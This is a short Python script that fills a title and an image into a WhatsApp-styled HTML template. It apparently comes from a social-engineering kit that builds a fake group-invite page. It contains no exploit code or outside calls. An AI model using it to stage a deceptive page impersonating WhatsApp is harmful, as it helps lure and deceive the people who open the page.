#!/usr/bin/env python3

import os
import shutil

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = input(G + '[+]' + C + ' Group Title : ' + W)
image = input(G + '[+]' + C + ' Path to Group Img (Best Size : 300x300): ' + W)

img_name = image.split('/')[-1]
try:
    shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
except Exception as e:
    print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
    exit()

with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)